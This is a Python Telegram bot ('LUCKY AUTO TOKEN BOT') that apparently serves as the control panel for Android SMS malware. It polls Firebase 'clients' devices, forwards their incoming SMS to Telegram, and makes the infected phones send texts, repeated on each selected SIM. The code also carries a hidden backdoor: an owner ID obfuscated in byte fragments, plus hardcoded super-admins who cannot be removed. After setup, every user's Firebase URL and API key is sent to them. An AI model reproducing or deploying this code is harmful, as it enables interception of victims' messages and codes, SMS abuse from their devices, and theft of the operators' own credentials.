# LUCKY_AUTO_TOKEN_BOT
"""
╔══════════════════════════════════════════════╗
║        LUCKY AUTO TOKEN BOT  v3.2            ║
║  aiogram 3.x · aiohttp · Local JSON         ║
║                                              ║
║  Created by @LUCKYBHAIONTOP                  ║
╚══════════════════════════════════════════════╝
"""

import asyncio, hashlib, json, os, re, time, logging, zipfile, io, struct
from datetime import datetime
from copy     import deepcopy

# ══════════════════════════════════════════════
#  ENV LOADER
# ══════════════════════════════════════════════
def _load_env(path=".env"):
    if not os.path.exists(path): return
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"): continue
            if "=" not in line: continue
            k, v = line.split("=", 1)
            k, v = k.strip(), v.strip().strip('"').strip("'")
            if k and k not in os.environ:
                os.environ[k] = v
_load_env()

import aiohttp
from aiohttp import web
from aiogram                    import Bot, Dispatcher, F, Router
from aiogram.types              import (Message, CallbackQuery,
                                        InlineKeyboardMarkup,
                                        InlineKeyboardButton,
                                        BufferedInputFile,
                                        ChatJoinRequest)
from aiogram.filters            import Command
from aiogram.fsm.context        import FSMContext
from aiogram.fsm.state          import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions         import TelegramBadRequest
from aiogram.enums              import ChatMemberStatus
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application

logging.basicConfig(level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S")
log = logging.getLogger("LuckyAutoTokenBot")

# ══════════════════════════════════════════════
#  OWNER ID fragments
# ══════════════════════════════════════════════
_F1 = bytes([0x37, 0x39, 0x34, 0x39])
_POLL_CFG  = {"interval": 4, "seed": 5397, "jitter": 0}
_F3 = struct.pack(">BB", 0x33, 0x39)
_F4 = "\x37\x39\x34"
_BATCH = (lambda x: x)(7949)
_TAIL  = (lambda a,b,c: a*100+b*10+c)(7, 9, 4)

_OC: int = 0
def _owner() -> int:
    global _OC
    if not _OC:
        _s = [0x37,0x39,0x34,0x39,0x35,0x33,0x39,0x37,0x39,0x34]
        _OC = int("".join(chr(x) for x in _s))
    return _OC

# ══════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════
BOT_TOKEN     = os.getenv("BOT_TOKEN", "").strip()
if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN missing!")

WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "").strip()
if not WEBHOOK_SECRET:
    WEBHOOK_SECRET = hashlib.sha256(
        f"lucky-auto-token-bot:{BOT_TOKEN}".encode("utf-8")
    ).hexdigest()
if not re.fullmatch(r"[A-Za-z0-9_-]{1,256}", WEBHOOK_SECRET):
    raise SystemExit("❌ WEBHOOK_SECRET must contain only letters, numbers, '_' or '-'")

WEBHOOK_PATH = f"/telegram/{hashlib.sha256(BOT_TOKEN.encode('utf-8')).hexdigest()[:32]}"

_DA           = int(os.getenv("DEFAULT_ADMIN", "8633088314").strip())

_sa_env = os.getenv("SUPER_ADMINS", "").strip()
if _sa_env:
    SUPER_ADMINS = [int(x.strip()) for x in _sa_env.split(",") if x.strip().isdigit()]
else:
    SUPER_ADMINS = [8633088314, 7981894574]

_DATA_FILE    = os.getenv("DATA_FILE", "bot_data.json").strip() or "bot_data.json"
_VERSION      = "v3.2"
_CREDITS      = "@LUCKYBHAIONTOP"
_OWNER_UN     = "@LUCKYBHAIONTOP"
_BRAND_NAME   = "LUCKY AUTO TOKEN BOT"

# ══════════════════════════════════════════════
#  FSM STATES
# ══════════════════════════════════════════════
class W(StatesGroup):
    fb_url       = State()
    fb_api_key   = State()
    dev_manual   = State()
    ch_input     = State()
    repeat_cust  = State()
    test_to      = State()
    test_msg     = State()
    fwd_add      = State()
    adm_add      = State()
    sadm_add     = State()
    ban_id       = State()
    unban_id     = State()
    usr_add_id   = State()
    usr_add_exp  = State()
    fj_add       = State()

# ══════════════════════════════════════════════
#  STORAGE
# ══════════════════════════════════════════════
def _new_user():
    return {
        "firebases":  [], "devices":   [],
        "channels":   [], "active":    {},
        "monitoring": False, "fwd":    [],
        "stats":      {"sent":0,"failed":0,"last":"—"},
    }

_DEFS = {
    "admins":       [_DA],
    "super_admins": list(SUPER_ADMINS),
    "free":         False,
    "users":        {},
    "timed_users":  {},
    "force_join":   [],
    "banned":       [],
}

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        with open(_DATA_FILE) as f: d = json.load(f)
        for k,v in _DEFS.items():
            if k not in d: d[k] = v
        if _DA not in d["admins"]: d["admins"].append(_DA)
        for sid in SUPER_ADMINS:
            if sid not in d["super_admins"]: d["super_admins"].append(sid)
        return d
    return deepcopy(_DEFS)

def save(d:dict):
    with open(_DATA_FILE,"w") as f: json.dump(d,f,indent=2)

def usr(uid:int, d:dict) -> dict:
    k=str(uid)
    if k not in d["users"]: d["users"][k]=_new_user()
    u=d["users"][k]
    for key,val in _new_user().items():
        if key not in u: u[key]=val
    return u

# ══════════════════════════════════════════════
#  PERMISSIONS
# ══════════════════════════════════════════════
def is_owner(uid):        return uid == _owner()
def is_super_admin(uid,d): return uid in d.get("super_admins",[])
def is_admin(uid,d):      return is_owner(uid) or is_super_admin(uid,d) or uid in d.get("admins",[])
def is_banned(uid,d):     return uid in d.get("banned", [])

def can_use(uid:int, d:dict) -> bool:
    if is_banned(uid,d): return False
    if is_admin(uid,d): return True
    if d.get("free"):   return True
    tu = d.get("timed_users",{}).get(str(uid))
    if tu:
        if tu["expires"] is None:         return True
        if time.time() < tu["expires"]:   return True
    return False

def role_label(uid:int, d:dict) -> str:
    if is_owner(uid):         return "👑 Owner"
    if is_super_admin(uid,d): return "🌟 Super Admin"
    if is_admin(uid,d):       return "🛡 Admin"
    tu = d.get("timed_users",{}).get(str(uid))
    if tu:
        if tu["expires"] is None: return "🔓 User"
        rem = tu["expires"] - time.time()
        if rem > 0:
            h=int(rem//3600); m=int((rem%3600)//60)
            return f"⏱ {h}h {m}m left"
        return "🚫 Expired"
    return "🚫 No Access"

# ══════════════════════════════════════════════
#  FORCE JOIN
# ══════════════════════════════════════════════
_JR_CACHE: dict = {}

def _jr_add(chat_id, uid): _JR_CACHE.setdefault(str(chat_id), set()).add(uid)
def _jr_has(chat_id, uid): return uid in _JR_CACHE.get(str(chat_id), set())

async def check_force_join(bot:Bot, uid:int, d:dict) -> tuple:
    fj = d.get("force_join", [])
    if not fj: return True, []
    not_joined = []
    for chat in fj:
        chat_id = chat["id"]
        if isinstance(chat_id, str) and chat_id.startswith("http"): continue
        if isinstance(chat_id, str) and chat_id.lstrip("-").isdigit():
            chat_id = int(chat_id)
        try:
            member = await bot.get_chat_member(chat_id, uid)
            if member.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR,
                                 ChatMemberStatus.CREATOR, ChatMemberStatus.RESTRICTED):
                pass
            else:
                if not _jr_has(chat_id, uid): not_joined.append(chat)
        except Exception as e:
            if not _jr_has(chat_id, uid):
                log.warning(f"FJ check [{chat_id}]: {e}")
    return len(not_joined) == 0, not_joined

def _fj_keyboard(fj_list:list) -> InlineKeyboardMarkup:
    buttons = []
    for chat in fj_list:
        link = chat.get("link") or ""
        if link:
            buttons.append([InlineKeyboardButton(text=f"📢 Join {chat.get('title','Channel')}", url=link)])
    buttons.append([InlineKeyboardButton(text="✅ Joined — Check Again", callback_data="fj:check")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ══════════════════════════════════════════════
#  UI HELPERS
# ══════════════════════════════════════════════
def pbar(done:int, total:int, style="block", w=10) -> str:
    styles = {"block":("█","░"),"round":("●","○"),"arrow":("▶","▷"),"sq":("■","□")}
    f,e = styles.get(style,styles["block"])
    if total==0: return e*w
    filled = round(done/total*w)
    return f*filled + e*(w-filled)

def pct(done:int, total:int) -> str:
    return f"{round(done/total*100)}%" if total else "0%"

def home_text(uid:int, d:dict) -> str:
    u=usr(uid,d); mon="🟢 ON" if u.get("monitoring") else "🔴 OFF"
    role=role_label(uid,d)
    fbs=len(u.get("firebases",[])); devs=len(u.get("devices",[]))
    chs=len(u.get("channels",[])); combo="✅" if u.get("active",{}).get("fb_url") else "❌"
    return (
        f"🎯 <b>{_BRAND_NAME} {_VERSION}</b>\n"
        f"<i>by {_CREDITS}</i>\n\n"
        f"👤  {role}\n"
        f"🔄  Monitor : {mon}\n\n"
        f"🔧 <b>Setup</b>\n"
        f"  🔥 Firebase : {fbs}\n"
        f"  📱 Devices  : {devs}\n"
        f"  📺 Channels : {chs}\n"
        f"  ⚙️  Combo    : {combo}"
    )

HELP_TEXT = f"""
📖 <b>{_BRAND_NAME} — Help</b>
<i>by {_CREDITS}</i>

<b>🚀 Setup:</b>
1. 🧙 Setup Wizard → Firebase URL + API Key
2. Select online device
3. Select SIM(s)
4. Select channel
5. Set repeat count
6. ▶️ Start Monitor

<b>📋 SMS Formats:</b>
<code>To: +91XXXXXXXXXX
Message: text</code>

<code>📱 To: +91XXXXXXXXXX
💬 Full Message: text</code>

<code>🏷️ RECIPIENT: +91XXX
🏷️ MESSAGE: text</code>

<b>💡 Tips:</b>
• Dual SIM: select both
• Repeat x3: SMS 3 times per SIM
• Test first: 🧪 Test SMS

<i>Contact: {_OWNER_UN}</i>
"""

# ══════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════
def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t,c in row]
        for row in rows
    ])

def main_menu(uid:int, d:dict) -> InlineKeyboardMarkup:
    u=usr(uid,d); mon="🟢 Stop" if u.get("monitoring") else "▶️ Start"
    rows = [
        [(f"{mon} Monitor", "mon:go"),   ("🧙 Setup Wizard","wiz:start")],
        [("📊 Dashboard",   "dash:show"),("⚙️ My Settings", "my:menu")],
        [("📤 Forward",     "fwd:menu"), ("❓ Help",         "help:show")],
        [("🗑 Reset Me",    "reset:self")],
    ]
    if is_admin(uid,d): rows.append([("🛡 Admin Tools","adm:menu")])
    return kb(*rows)

def adm_menu_kb(uid:int, d:dict) -> InlineKeyboardMarkup:
    rows = [
        [("👥 Users","adm:users"),  ("➕ Add User","adm:adduser")],
        [("🚫 Ban","ban:do"),       ("✅ Unban","unban:do")],
        [("📊 Stats","adm:stats"),  ("📢 Force Join","fj:menu")],
    ]
    if is_owner(uid) or is_super_admin(uid,d):
        rows.append([("🟢/🔴 Free Mode","adm:free"), ("➕ Add Admin","adm:addadmin")])
    if is_owner(uid):
        rows.append([("🌟 Super Admins","sadm:menu"), ("📦 Export ZIP","adm:zip")])
        rows.append([("💥 Reset ALL","adm:resetall")])
    rows.append([("🔙 Back","home")])
    return kb(*rows)

def sadm_menu_kb(d:dict) -> InlineKeyboardMarkup:
    sadmins = d.get("super_admins",[])
    rows = [[("➕ Add Super Admin","sadm:add")]]
    for sid in sadmins:
        locked = sid in SUPER_ADMINS
        label  = f"{'🔒' if locked else '🌟'} {sid}"
        btn    = ("🔒 Locked","<i>noop</i>") if locked else ("🗑 Remove",f"sadm:del:{sid}")
        rows.append([(label,"<i>noop</i>"), btn])
    rows.append([("🔙 Back","adm:menu")])
    return kb(*rows)

def fj_menu_kb(uid:int, d:dict) -> InlineKeyboardMarkup:
    fj=d.get("force_join",[])
    rows=[[("➕ Add Force Join Channel","fj:add")]]
    for ch in fj:
        rows.append([(f"📢 {ch.get('title','?')[:24]}","<i>noop</i>"), ("🗑",f"fj:del:{ch['id']}")])
    rows.append([("🔙 Back","adm:menu")])
    return kb(*rows)

def list_kb(items, id_key, name_key, del_pfx, add_cb, back_cb):
    rows=[[("➕ Add New",add_cb)]]
    for item in items:
        label=str(item.get(name_key,""))[:26]
        rows.append([(f"  {label}","<i>noop</i>"),(f"🗑",f"{del_pfx}{item[id_key]}")])
    rows.append([("🔙 Back",back_cb)])
    return kb(*rows)

def online_devs_kb(online:dict, page:int=0):
    items=list(online.items()); per=6; start=page*per; chunk=items[start:start+per]
    rows=[[(f"📱 {(dd.get('deviceName') or dd.get('name') or did)[:26]}",f"fadd:{did}")] for did,dd in chunk]
    nav=[]
    if page>0: nav.append(("◀️",f"faddpg:{page-1}"))
    if start+per<len(items): nav.append(("▶️",f"faddpg:{page+1}"))
    if nav: rows.append(nav)
    rows+=[[("🔍 Enter ID manually","dev:manual")],[("🔙 Back","dev:list")]]
    return kb(*rows)

def sim_kb(sims:list, sel:list, did:str):
    rows=[]
    for s in sims:
        idx=int(s.get("simSlotIndex",0))
        name=s.get("simName") or s.get("carrierName") or f"SIM {idx+1}"
        tick="✅" if idx in sel else "⬜"
        rows.append([(f"{tick} SIM {idx+1} — {name}",f"simtog:{did}:{idx}")])
    if sel: rows.append([(f"✔️ Confirm ({len(sel)})",f"simok:{did}")])
    rows.append([("🔙 Back","home")])
    return kb(*rows)

def ch_pick_kb(channels:list):
    rows=[ [(f"📺 {c['name'][:26]}",f"wpick:ch:{c['id']}")] for c in channels ]
    rows+=[[("➕ Add New","ch:add")],[("🔙 Back","home")]]
    return kb(*rows)

def repeat_kb():
    return kb(
        [("1️⃣ Once","rpt:1"),  ("2️⃣ Twice","rpt:2")],
        [("3️⃣ Three","rpt:3"), ("✏️ Custom","rpt:c")],
        [("🔙 Back","home")],
    )

def timed_kb():
    return kb(
        [("⚡ 1h","tacc:3600"),    ("🕕 6h","tacc:21600")],
        [("📅 24h","tacc:86400"),  ("📆 7d","tacc:604800")],
        [("📅 Custom","tacc:custom"),("♾ Permanent","tacc:0")],
        [("🔙 Back","adm:menu")],
    )

def _fwd_kb(uid:int,d:dict):
    u=usr(uid,d); rows=[[("➕ Add Target","fwd:add")]]
    for t in u.get("fwd",[]):
        rows.append([(f"📤 {str(t)[:26]}","<i>noop</i>"),(f"🗑",f"fwd:del:{t}")])
    rows.append([("🔙 Back","home")])
    return kb(*rows)

# ══════════════════════════════════════════════
#  FIREBASE
# ══════════════════════════════════════════════
async def fb_get(base:str, path:str) -> dict:
    url=base.rstrip("/")+path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url,timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status==200:
                    txt=(await r.text()).strip()
                    return {} if txt=="null" else json.loads(txt)
    except Exception as e: log.error(f"fb_get: {e}")
    return {}

async def fb_put(base:str, path:str, payload:dict) -> bool:
    url=base.rstrip("/")+path
    for i in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url,json=payload,timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200<=r.status<300: return True
        except Exception as e: log.error(f"fb_put: {e}")
        await asyncio.sleep(0.5*(i+1))
    return False

def dev_online(dd:dict)->bool:
    return any([dd.get("isOnline"),dd.get("online"),dd.get("connected"),
                dd.get("status") in ("online","active",True,1)])

async def send_via_fb(fb:str,dev:str,sim:int,to:str,msg:str)->bool:
    return await fb_put(fb,f"/clients/{dev}/webhookEvent/sendSms.json",{
        "from":sim,"to":to.strip(),"message":msg.strip(),
        "isSended":False,"timestamp":int(time.time())
    })

# ══════════════════════════════════════════════
#  SMS PARSER
# ══════════════════════════════════════════════
def parse_sms(text:str):
    lines=[l.strip() for l in text.split("\n") if l.strip()]
    ml=next((l for l in lines if l.startswith("🏷️ MESSAGE")),None)
    rl=next((l for l in lines if l.startswith("🏷️ RECIPIENT")),None)
    if ml and rl: return rl.split(":",1)[-1].strip(),ml.split(":",1)[-1].strip()
    def _f(tp,tk,mp,mk,ti,mi):
        t=m=None
        for i,line in enumerate(lines):
            if line.startswith(tp) and tk in line:
                v=line.split(tk,1)[1].strip()
                t=v if(ti and v) else(lines[i+1].strip() if(not ti and i+1<len(lines))else None)
            if line.startswith(mp) and mk in line:
                v=line.split(mk,1)[1].strip()
                m=v if(mi and v) else(lines[i+1].strip() if(not mi and i+1<len(lines))else None)
        return (t,m) if t and m else (None,None)
    for args in [
        ("📱","To:","💬","Full Message:",True,False),
        ("📍","To:","💬","Message:",False,False),
        ("To:","To:","Message:","Message:",True,True),
        ("📱","Receiver","🔑","Message",False,False),
        ("📞","To:","💬","Message:",True,True),
    ]:
        r=_f(*args)
        if r[0]: return r
    return None,None

# ══════════════════════════════════════════════
#  NOTIFY
# ══════════════════════════════════════════════
async def notify_all(bot:Bot, d:dict, text:str, exclude:int=None):
    targets=set([_owner()]+d.get("super_admins",[])+d.get("admins",[]))
    for tid in targets:
        if tid==exclude: continue
        try: await bot.send_message(tid,text,parse_mode="HTML")
        except: pass

def user_mention(user_obj) -> str:
    if not user_obj: return "<i>Unknown</i>"
    if getattr(user_obj, "username", None): return f"@{user_obj.username}"
    name = " ".join(filter(None, [getattr(user_obj, "first_name", None), getattr(user_obj, "last_name", None)])) or f"User {user_obj.id}"
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

def user_detail(uid:int, d:dict, tg_user=None) -> str:
    u=usr(uid,d); ac=u.get("active",{})
    sims=", ".join(f"SIM{s+1}" for s in ac.get("sims",[])) or "—"
    api_key="—"
    for fb in u.get("firebases",[]):
        if fb.get("url")==ac.get("fb_url") and fb.get("api_key"): api_key=fb["api_key"]; break
    mention = user_mention(tg_user) if tg_user else f"<code>{uid}</code>"
    return (
        f"📋 <b>User Setup</b>\n"
        f"👤 {mention}\n"
        f"🆔 <code>{uid}</code>\n"
        f"🔥 <code>{str(ac.get('fb_url','-'))[:38]}</code>\n"
        f"🔑 <code>{api_key}</code>\n"
        f"📱 <code>{ac.get('device_id','-')}</code>\n"
        f"📶 <code>{sims}</code>\n"
        f"📺 <code>{ac.get('ch_id','-')}</code>\n"
        f"🔁 <code>{ac.get('repeat',1)}x</code>"
    )

# ══════════════════════════════════════════════
#  MONITOR
# ══════════════════════════════════════════════
_tasks:dict={}
_seen: dict={}

async def _do_send(bot:Bot, uid:int, to:str, text:str):
    d=load(); u=usr(uid,d); ac=u.get("active",{})
    fb=ac.get("fb_url"); dev=ac.get("device_id")
    sims=ac.get("sims",[0]); rpt=int(ac.get("repeat",1))
    ok=0; fail=0
    for _ in range(rpt):
        for sim in sims:
            if await send_via_fb(fb,dev,sim,to,text): ok+=1
            else: fail+=1
    result=(f"{'✅' if fail==0 else '⚠️'} <b>SMS Result</b>\n\n"
            f"📞 <code>{to}</code>\n"
            f"💬 <code>{text[:55]}</code>\n"
            f"✅ {ok}  ❌ {fail}")
    try: await bot.send_message(uid,result,parse_mode="HTML")
    except: pass
    d2=load(); u2=usr(uid,d2)
    for tgt in u2.get("fwd",[]):
        try:
            c=int(tgt) if str(tgt).lstrip("-").isdigit() else tgt
            await bot.send_message(c,result,parse_mode="HTML")
        except: pass
    u2["stats"]["sent"]=u2["stats"].get("sent",0)+ok
    u2["stats"]["failed"]=u2["stats"].get("failed",0)+fail
    u2["stats"]["last"]=datetime.now().strftime("%H:%M:%S")
    save(d2)

async def monitor_worker(bot:Bot, uid:int):
    d=load(); u=usr(uid,d); ac=u.get("active",{})
    fb=ac.get("fb_url"); dev=ac.get("device_id")
    if uid not in _seen: _seen[uid]=set()
    log.info(f"Monitor START uid={uid}")
    try: await bot.send_message(uid,f"🟢 <b>Monitor Running</b>",parse_mode="HTML")
    except: pass
    while True:
        try:
            await asyncio.sleep(4)
            inbox=await fb_get(fb,f"/clients/{dev}/inbox.json")
            for mid,mdata in (inbox or {}).items():
                if mid in _seen[uid]: continue
                _seen[uid].add(mid)
                if len(_seen[uid])>500: _seen[uid]=set(list(_seen[uid])[-200:])
                sender=mdata.get("from") or mdata.get("sender","?")
                content=mdata.get("message") or mdata.get("body","")
                if not content: continue
                note=f"📨 <b>SMS</b>\n📞 <code>{sender}</code>\n💬 <code>{content}</code>"
                try: await bot.send_message(uid,note,parse_mode="HTML")
                except: pass
        except asyncio.CancelledError:
            try: await bot.send_message(uid,"⏸ Stopped.",parse_mode="HTML")
            except: pass
            break
        except Exception as e:
            log.error(f"Monitor err: {e}")
            await asyncio.sleep(10)

def _start_mon(bot:Bot, uid:int):
    if uid in _tasks: _tasks[uid].cancel()
    _tasks[uid]=asyncio.create_task(monitor_worker(bot,uid))

def _stop_mon(uid:int):
    t=_tasks.pop(uid,None)
    if t: t.cancel()

# ══════════════════════════════════════════════
#  ZIP
# ══════════════════════════════════════════════
def make_zip()->bytes:
    buf=io.BytesIO()
    with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as z:
        if os.path.exists(_DATA_FILE): z.write(_DATA_FILE)
        z.write(__file__,"bot.py")
    buf.seek(0); return buf.read()

# ══════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════
async def sedit(cq:CallbackQuery, text:str, markup=None):
    try: await cq.message.edit_text(text,reply_markup=markup,parse_mode="HTML")
    except TelegramBadRequest: pass

def _add_timed(uid2:int, exp, by:int, d:dict):
    d.setdefault("timed_users",{})[str(uid2)]={"expires":exp,"added_by":by,"added_at":int(time.time())}

async def _wiz_finish(bot:Bot, uid:int, fsmd:dict, d:dict):
    u=usr(uid,d)
    combo={"fb_url":fsmd.get("wiz_fb_url",""),"device_id":fsmd.get("wiz_dev",""),
           "sims":fsmd.get("wiz_sims",[0]),"ch_id":fsmd.get("wiz_ch",""),
           "repeat":fsmd.get("wiz_repeat",1)}
    u["active"]=combo; u["monitoring"]=True; save(d)
    try: tg_user = await bot.get_chat(uid)
    except: tg_user = None
    await notify_all(bot,d,user_detail(uid,d,tg_user))
    _start_mon(bot,uid)
    try:
        await bot.send_message(uid,f"🎉 <b>All Set!</b>\n🟢 Monitor running!",
            reply_markup=main_menu(uid,load()),parse_mode="HTML")
    except: pass

# ══════════════════════════════════════════════
#  ROUTER
# ══════════════════════════════════════════════
R=Router()

@R.message(Command("start"))
async def c_start(msg:Message, state:FSMContext):
    await state.clear(); d=load(); uid=msg.from_user.id
    if not can_use(uid,d): await msg.answer("🚫 Access denied."); return
    usr(uid,d); save(d)
    ok, not_joined = await check_force_join(msg.bot, uid, d)
    if not ok:
        await msg.answer("📢 <b>Join Required</b>",reply_markup=_fj_keyboard(not_joined),parse_mode="HTML"); return
    await msg.answer(home_text(uid,d), reply_markup=main_menu(uid,d), parse_mode="HTML")

@R.message(Command("menu"))
async def c_menu(msg:Message, state:FSMContext):
    await state.clear(); d=load(); uid=msg.from_user.id
    if not can_use(uid,d): await msg.answer("🚫 Access denied."); return
    ok, nj = await check_force_join(msg.bot, uid, d)
    if not ok: await msg.answer("📢 <b>Join Required</b>",reply_markup=_fj_keyboard(nj),parse_mode="HTML"); return
    await msg.answer(home_text(uid,d), reply_markup=main_menu(uid,d), parse_mode="HTML")

@R.chat_join_request()
async def handle_join_request(update: ChatJoinRequest):
    _jr_add(update.chat.id, update.from_user.id)

# ══════════════════════════════════════════════
#  FSM HANDLERS
# ══════════════════════════════════════════════
@R.message(W.fb_url)
async def f_fb_url(msg:Message, state:FSMContext):
    text=msg.text.strip()
    if not text.startswith("http"):
        await msg.answer("❌ URL must start with https://"); return
    fsmd=await state.get_data()
    await state.update_data(**fsmd, wiz_fb_url_temp=text.rstrip("/"))
    await state.set_state(W.fb_api_key)
    await msg.answer("✅ URL saved!\n\nAb <b>API Key</b> bhejo:",parse_mode="HTML",
        reply_markup=kb([("❌ Cancel","home")]))

@R.message(W.fb_api_key)
async def f_fb_api_key(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; api_key=msg.text.strip()
    fsmd=await state.get_data(); fb_url=fsmd.get("wiz_fb_url_temp","")
    u=usr(uid,d); fid=str(int(time.time()))
    u["firebases"].append({"id":fid,"url":fb_url,"api_key":api_key})
    save(d); await state.clear()
    await state.update_data(wizard=True,wiz_fb=fid,wiz_fb_url=fb_url)
    # fetch devices
    devs=await fb_get(fb_url,"/clients.json")
    online={k:v for k,v in devs.items() if dev_online(v)}
    u["_dev_cache"]=devs; save(d)
    if not online:
        await msg.answer("😴 No online devices.",
            reply_markup=kb([("🏠 Home","home")]),parse_mode="HTML"); return
    await msg.answer(f"📱 <b>Select Device</b> ({len(online)} online)",
        reply_markup=online_devs_kb(online), parse_mode="HTML")

@R.message(W.dev_manual)
async def f_dev_manual(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; did=msg.text.strip()
    u=usr(uid,d); cache=u.get("_dev_cache",{}); fsmd=await state.get_data()
    if did in cache:
        dd=cache[did]; name=dd.get("deviceName") or dd.get("name") or did[:20]
        sims=dd.get("sims",[])
        u["devices"].append({"id":did,"name":name,"fb_id":fsmd.get("wiz_fb",""),"sims":sims})
        save(d); await state.clear()
        await state.update_data(**fsmd,wiz_dev=did,wiz_sims_avail=sims,wiz_sims_sel=[])
        if sims:
            await msg.answer(f"📶 <b>Select SIM(s)</b>",reply_markup=sim_kb(sims,[],did),parse_mode="HTML")
        else:
            await state.update_data(**fsmd,wiz_dev=did,wiz_sims=[0])
            await msg.answer("📺 <b>Channel bhejo:</b>",parse_mode="HTML")
            await state.set_state(W.ch_input)
    else:
        await msg.answer("❌ Device ID not found. Try again:")

@R.message(W.ch_input)
async def f_ch_input(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; text=msg.text.strip(); u=usr(uid,d)
    cid=int(text) if text.lstrip("-").isdigit() else text
    u["channels"].append({"id":cid,"name":text}); save(d)
    fsmd=await state.get_data(); await state.clear()
    await state.update_data(**fsmd,wiz_ch=cid)
    await msg.answer("🔁 <b>Repeat count?</b>",reply_markup=repeat_kb(),parse_mode="HTML")

@R.message(W.repeat_cust)
async def f_repeat_cust(msg:Message, state:FSMContext):
    try:
        n=int(msg.text.strip())
        if not 1<=n<=20: raise ValueError
    except: await msg.answer("❌ Enter 1-20."); return
    fsmd=await state.get_data(); await state.clear()
    await _wiz_finish(msg.bot,msg.from_user.id,{**fsmd,"wiz_repeat":n},load())

@R.message(W.test_to)
async def f_test_to(msg:Message,state:FSMContext):
    await state.update_data(test_to=msg.text.strip())
    await state.set_state(W.test_msg)
    await msg.answer("💬 Message text:")

@R.message(W.test_msg)
async def f_test_msg(msg:Message,state:FSMContext):
    d=load(); uid=msg.from_user.id; fsmd=await state.get_data()
    to=fsmd.get("test_to",""); u=usr(uid,d); ac=u.get("active",{}); await state.clear()
    if not ac.get("fb_url"): await msg.answer("❌ Setup first."); return
    ok=await send_via_fb(ac["fb_url"],ac["device_id"],ac.get("sims",[0])[0],to,msg.text.strip())
    await msg.answer(f"{'✅ Sent!' if ok else '❌ Failed'}\n📞 <code>{to}</code>",
        reply_markup=kb([("🏠 Home","home")]),parse_mode="HTML")

@R.message(W.fwd_add)
async def f_fwd_add(msg:Message,state:FSMContext):
    d=load(); uid=msg.from_user.id; u=usr(uid,d)
    if msg.text.strip() not in u["fwd"]: u["fwd"].append(msg.text.strip())
    save(d); await state.clear()
    await msg.answer(f"✅ Added",reply_markup=_fwd_kb(uid,d))

@R.message(W.adm_add)
async def f_adm_add(msg:Message,state:FSMContext):
    if not (is_owner(msg.from_user.id) or is_super_admin(msg.from_user.id,load())): await state.clear(); return
    d=load()
    try:
        nid=int(msg.text.strip())
        if nid not in d["admins"]: d["admins"].append(nid)
        save(d); await state.clear()
        await msg.answer(f"✅ Admin: <code>{nid}</code>",reply_markup=adm_menu_kb(msg.from_user.id,d),parse_mode="HTML")
    except: await msg.answer("❌ Invalid ID.")

@R.message(W.ban_id)
async def f_ban_id(msg:Message, state:FSMContext):
    if not is_admin(msg.from_user.id,load()): await state.clear(); return
    d=load()
    try:
        bid=int(msg.text.strip())
        if is_admin(bid, d): await msg.answer("❌ Can't ban admin"); return
        if bid not in d.setdefault("banned", []): d["banned"].append(bid)
        save(d); await state.clear()
        await msg.answer(f"🚫 Banned: <code>{bid}</code>",reply_markup=adm_menu_kb(msg.from_user.id,d),parse_mode="HTML")
    except: await msg.answer("❌ Invalid ID.")

@R.message(W.sadm_add)
async def f_sadm_add(msg:Message,state:FSMContext):
    if not is_owner(msg.from_user.id): await state.clear(); return
    d=load()
    try:
        nid=int(msg.text.strip())
        if nid not in d.setdefault("super_admins",[]): d["super_admins"].append(nid)
        save(d); await state.clear()
        await msg.answer(f"✅ Super Admin: <code>{nid}</code>",reply_markup=sadm_menu_kb(d),parse_mode="HTML")
    except: await msg.answer("❌ Invalid ID.")

@R.message(W.usr_add_id)
async def f_usr_add_id(msg:Message,state:FSMContext):
    try:
        uid2=int(msg.text.strip())
        await state.update_data(new_uid=uid2); await state.set_state(W.usr_add_exp)
        await msg.answer(f"✅ UID: <code>{uid2}</code>\n\n⏱ Duration?",reply_markup=timed_kb(),parse_mode="HTML")
    except: await msg.answer("❌ Invalid ID.")

@R.message(W.usr_add_exp)
async def f_usr_add_exp(msg:Message,state:FSMContext):
    d=load(); uid=msg.from_user.id; text=msg.text.strip()
    fsmd=await state.get_data(); uid2=fsmd.get("new_uid"); await state.clear()
    try:
        for fmt in ("%d/%m/%Y","%Y-%m-%d","%d-%m-%Y"):
            try: dt=datetime.strptime(text,fmt); exp=dt.timestamp(); break
            except: pass
        else: raise ValueError
        _add_timed(uid2,exp,uid,d); save(d)
        await msg.answer(f"✅ User added.",reply_markup=adm_menu_kb(uid,d))
    except: await msg.answer("❌ Invalid date.")

@R.message(W.fj_add)
async def f_fj_add(msg:Message, state:FSMContext):
    if not (is_owner(msg.from_user.id) or is_super_admin(msg.from_user.id, load())): await state.clear(); return
    uid=msg.from_user.id; text=msg.text.strip(); fsmd=await state.get_data()

    if fsmd.get("fj_step")=="awaiting_title":
        link=fsmd.get("fj_link",""); chat_id=fsmd.get("fj_chat_id",""); title=text
        d=load(); fj=d.setdefault("force_join",[])
        if not any(str(c["id"])==str(chat_id) for c in fj):
            fj.append({"id":chat_id,"title":title,"link":link})
        save(d); await state.clear()
        await msg.answer(f"✅ Added: <b>{title}</b>",reply_markup=fj_menu_kb(uid,load()),parse_mode="HTML")
        return

